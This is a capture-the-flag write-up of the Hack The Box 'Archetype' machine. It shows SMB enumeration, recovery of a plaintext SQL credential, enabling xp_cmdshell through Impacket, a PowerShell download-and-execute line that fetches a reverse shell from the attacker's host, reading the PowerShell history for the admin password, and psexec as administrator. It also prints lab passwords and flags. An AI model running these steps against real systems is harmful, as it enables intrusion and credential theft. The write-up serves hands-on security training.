---
weight: 4
title: "HTB Starting Point - Archetype"
date: '2026-07-15T14:30:53-07:00'
draft: false
author: "ic3sec"
authorLink: ""
description: "Writeup/Walkthrough for HTB Starting Point - Archetype"
images: []

tags: ["Writeup", "2026", "CTF", "HTB", "Hack the Box", "HTB Starting Point", "Walkthrough", "Windows", "HTB Very Easy", "Impacket", "SMB", "SQL", "Microsoft SQL"]
categories: ["Writeups", "CTF"]
---

## Overview
---
Part of the "starting point"  boxes on HTB, Archetype has a set of tasks with questions that provide a framework to walk through the machine. Archetype focuses on Microsoft services, including SMB enumeration, SQL server exploitation with Impacket and privlege escalation using a dirty Powershell history. As this machine is part of the “starting point” category, many of the tasks are fundamental knowledge questions - I highly recommend researching them a bit if you do not know the answer instead of copy/pasting.

|                  |               |
| ---------------- | ------------- |
| **Release Date** | 25 Oct, 2021  |
| **Difficulty**   | Very Easy     |
| **OS**           | Windows       |
| **Created By**   | [egre55](https://app.hackthebox.com/users/1190) |

---

## Tasks

---

### Task 1
---
{{< admonition type=question open=true >}}
Which TCP port is hosting a database server?
{{< /admonition >}}

We can start out with a quick nmap scan:
```bash
┌─[ice@parrot]─[~/Archetype]
└──╼ $nmap -p- --reason --min-rate 5000 10.129.95.187
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-15 18:26 UTC
Nmap scan report for 10.129.95.187
Host is up, received conn-refused (0.072s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
1433/tcp  open  ms-sql-s     syn-ack
5985/tcp  open  wsman        syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack

Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
```

Looks like we have quite a few open ports! We're looking for a database for the task, which the `ms-sql-s` matches.

{{< admonition type=warning title=Answer open=false >}}
1433
{{< /admonition >}}

---

### Task 2
---
{{< admonition type=question open=true >}}
What is the name of the non-Administrative share available over SMB?
{{< /admonition >}}

Here we need to look at what port is hosting SMB - by default, especially for non-modern versions of Windows, it is hosted on port 445, which we can see is hosting microsoft-ds (Microsoft Directory Services), confirming we have an SMB server there.

We can run `smbclient -L //10.129.95.187` and provide no password (or use the `-N` flag) to list the shares:
```bash
┌─[ice@parrot]─[~/Archetype]
└──╼ $smbclient -L //10.129.95.187/
Password for [WORKGROUP\ice]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

As we can see there are 4 shares available, any share that ends with `$` is an administrative share, so there is only one non-administrative share available.

{{< admonition type=warning title=Answer open=false >}}
backups
{{< /admonition >}}

---

### Task 3
---
{{< admonition type=question open=true >}}
What is the password identified in the file on the SMB share?
{{< /admonition >}}

Now we need to see what files are on the SMB share we identified, we can do so by connecting to the share and running `ls`:
```bash
┌─[ice@parrot]─[~/Archetype]
└──╼ $smbclient -N //10.129.95.187/backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

                5056511 blocks of size 4096. 2496962 blocks available
```

And now that we know the filename, we can run `get <filename>` to retrieve it:
```bash
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
```

Now we can check out the file and see what password it contains:
```bash
┌─[ice@parrot]─[~/Archetype]
└──╼ $cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>┌
```

{{< admonition type=warning title=Answer open=false >}}
M3g4c0rp123
{{< /admonition >}}

---

### Task 4
---
{{< admonition type=question open=true >}}
What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
{{< /admonition >}}

Impacket scripts can be viewed on the project's [GitHub page](https://github.com/fortra/impacket/tree/master/examples).

We know we are trying to connec to a Microsoft SQL server, so we can look for scripts specifically mentioning `mssql`.

{{< admonition type=warning title=Answer open=false >}}
mssqlclient.py
{{< /admonition >}}

---

### Task 5
---
{{< admonition type=question open=true >}}
What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
{{< /admonition >}}

We can view the available extended stored procedures for Microsoft SQL Server on Microsoft's site [here](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/agent-xps-server-configuration-option?view=sql-server-ver17).


{{< admonition type=note open=true >}}
In newer versions of Microsoft SQL Server, user-created extended stored procedures (XPs) have been deprecated, primarily being replaced by Common Language Runtime Integration (SQLCLR). However, there are still some interal Microsoft SQL Server XPs that are used, inclduing the one mentioned in this task.
{{< /admonition >}}

{{< admonition type=warning title=Answer open=false >}}
xp_cmdshell
{{< /admonition >}}

---

### Task 6
---
{{< admonition type=question open=true >}}
What script can be used in order to search possible paths to escalate privileges on Windows hosts?
{{< /admonition >}}

Part of the PEAS collection, specifically the script made for Windows.

{{< admonition type=warning title=Answer open=false >}}
WinPEAS
{{< /admonition >}}

---

### Task 7
---
{{< admonition type=question open=true >}}
What file contains the administrator's password?
{{< /admonition >}}

The steps we need to take here have been laid out fairly well by the tasks, we can start by getting a client on the SQL server using `impacket-mssqlclient` with the credentials that we found on the SMB share earlier:
```bash
┌─[ice@parrot]─[~/Archetype]
└──╼ $impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -port 1433 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

Now that we have an SQL client, we can use `xp_cmdshell` to excute commands on the system:
```sql
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell whoami
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Ah, that's interesting - looks like we will need to change this setting using `sp_configure` (details on `sp_configure` can be found [here](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver17)) - but first we need to set `show advanced options` to be able to set it:
```sql
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', '1';
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
```

Great - now we can try using `xp_cmdshell` again:
```sql
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell whoami
output
-----------------
archetype\sql_svc

NULL
```

Now that we have `xp_cmdshell` working, we can use it to spawn a more interactive shell. There are a few ways to go about this. I used this [Powershell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) by replacing the IP and port with my attacking IP and the port for a nc listener (started with `nc -lvnp 1234`). I saved this as `shell.ps1` and hosted it using `python3 -m http.server`.

After we host the shell file and start our nc listener, we can execute the shell on the server using:
```sql
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://<ATTACKING_IP>:8000/shell.ps1") | powershell'
```

Perfect, now that we have a shell on the machine we can enumerate it with WinPEAS - we can do this directly in memory by hosting it on our machine with `python3 -m http.server` (in a directory containing winPEAS) and invoking it using:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKING_IP>:8000/winPEAS.ps1')
```

Unfortuately this stalled on the machine. I did some more testing with other means of executing e.g. 
```powershell
[scriptblock]::Create((New-Object System.Net.WebClient).DownloadString('http://<ATTACKING_IP>:8000/winPEAS.ps1')).Invoke()
```

But I ran into issues there as well. I tried for a solid hour using different Powershell invocation methods and came up short. I tried downloading the file as well, of course, but it seemed to be getting automatically removed and/or was not executable.

Instead, to finish up the box, I decided to do some manual recon. Since we are in a powershell context, one of the first things that comes to mind to check is command history, this can be checked for a specific user (in this case, `sql_svc`) with the following command:
```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

In this case we get the following output:
```powershell
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

{{< admonition type=warning title=Answer open=false >}}
ConsoleHost_history.txt
{{< /admonition >}}

---

### Submit User Flag
---
All we need to do for the user flag is to navigate to sql_svc's desktop `cd C:\Users\sql_svc\Desktop` and print out the flag.

{{< admonition type=warning title=Answer open=false >}}
3e7b102e78218e935bf3f4951fec21a3
{{< /admonition >}}

---

### Submit Root Flag
---
As for the root flag, we know the administrator's login details from the last task, so we can use another impacket script `psexec.py` to get ourselves an easy shell as admin:
```bash
┌─[ice@parrot]─[~/Archetype]
└──╼ $impacket-psexec administrator@10.129.155.219
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Requesting shares on 10.129.155.219.....
[*] Found writable share ADMIN$
[*] Uploading file OOXqzdCP.exe
[*] Opening SVCManager on 10.129.155.219.....
[*] Creating service yOGD on 10.129.155.219.....
[*] Starting service yOGD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Now all we have left to do is navigate to the adminstrator desktop `cd C:\Users\Administrator\Desktop` and print out the flag.

{{< admonition type=warning title=Answer open=false >}}
b91ccec3305e98240082d4474b848528
{{< /admonition >}}

---

## Closing Thoughts
---
Archetype was a mostly solid box, it started off really well with walking through SMB enumeration, to Impacket SQL server authentication, and setting up the steps that the user would need to exploit the server afterwards. Where I feel it fell slightly short was on the suggestion to use WinPEAS, even though the system appears to be hardened against WinPEAS - of course, the value of learning about methods to get around hardening, etc. are very valuable, but I believe they are out of scope for a box in starting point. Not to mention that the box implies nothing of the sort, I have to imagine that at some point this was added? Or the tasks were written without that knowledge.

Either way, I still think it is a solid foundation for learning some basic Windows exploitation techniques and is well guided aside from that one part. Even then, that step mentions file history and a "specific program" which does give a good hint in the right direction of where  to look, with or without WinPEAS.

---